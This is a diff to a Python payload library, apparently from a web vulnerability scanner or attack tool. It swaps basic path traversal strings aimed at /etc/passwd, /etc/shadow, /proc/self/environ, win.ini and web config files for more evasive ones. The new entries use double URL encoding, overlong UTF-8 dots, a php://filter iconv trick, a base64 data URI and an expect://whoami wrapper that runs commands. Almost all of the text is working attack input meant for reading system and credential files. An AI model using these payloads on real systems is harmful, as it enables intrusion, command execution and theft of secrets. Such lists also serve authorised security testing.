@@ -107,45 +107,19 @@ SSTI_PAYLOADS = {
 }
 
 # --- Path Traversal Payloads ---
+
 PATH_TRAVERSAL_PAYLOADS = {
-    "common_files_unix": [
-        "../../../../../../../../../../etc/passwd",
-        "../../../../../../../../../../etc/shadow", # Usually needs root
-        "../../../../../../../../../../etc/hosts",
-        "../../../../../../../../../../etc/issue",
-        "../../../../../../../../../../etc/motd",
-        "../../../../../../../../../../proc/self/environ", # Check environment vars
-        "../../../../../../../../../../proc/version",
-        "../../../../../../../../../../var/log/apache2/access.log", # Example log file
-        "../../../../../../../../../../var/www/html/config.php", # Example config
-    ],
-    "common_files_windows": [
-        "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
-        "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini",
-        "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\system.ini",
-        "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\inetpub\\logs\\LogFiles\\W3SVC1\\u_exYYMMDD.log", # Example IIS log
-        "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\boot.ini", # Older windows
-        # "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\Users\\Administrator\\NTUser.dat", # Registry Hive - Might cause issues
-    ],
     "encoding_bypass": [
-        "..%2f..%2f..%2f..%2fetc%2fpasswd", # URL Encoded /
-        "..%5c..%5c..%5c..%5cwindows%5cwin.ini", # URL Encoded \
-        "%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd", # URL Encoded .
-        "..%c0%af..%c0%afetc/passwd", # Invalid UTF-8 / (Overlong)
-        "..%c1%9c..%c1%9cboot.ini", # Invalid UTF-8 \ (Overlong)
-        "....//....//....//etc/passwd", # Using //
-        "....\\\\....\\\\....\\\\windows\\\\win.ini", # Using \\
+        "..%252f..%252fetc%252fpasswd", # Double URL Encoding
+        "..%c0%ae%c0%ae..%c0%ae%c0%aeetc/passwd", # Overlong UTF-8 Dot
+        "%252e%252e%255c%252e%252e%255cwindows%255cwin.ini", # Double Encoded Windows
     ],
-    "null_byte_bypass": [ # Often ineffective on modern systems
-        "../../../../etc/passwd%00",
-        "..\\..\\..\\windows\\win.ini%00",
-    ],
-    "wrapper_bypass": [ # If PHP wrappers are enabled
-        "php://filter/resource=../../../../etc/passwd",
-        "php://filter/convert.base64-encode/resource=../../../../etc/passwd",
-        "file:///etc/passwd",
+    "wrapper_bypass": [
+        "php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=../../../../etc/passwd", # Encoding Trick
+        "expect://whoami", # Expect Wrapper (if enabled)
+        "data://text/plain;base64,Li4vLi4vZXRjL3Bhc3N3ZA==", # Base64 Data URI
     ]
-}
+} 
 
 # --- Out-of-Band (OOB) Payloads ---
 OOB_PAYLOADS = {
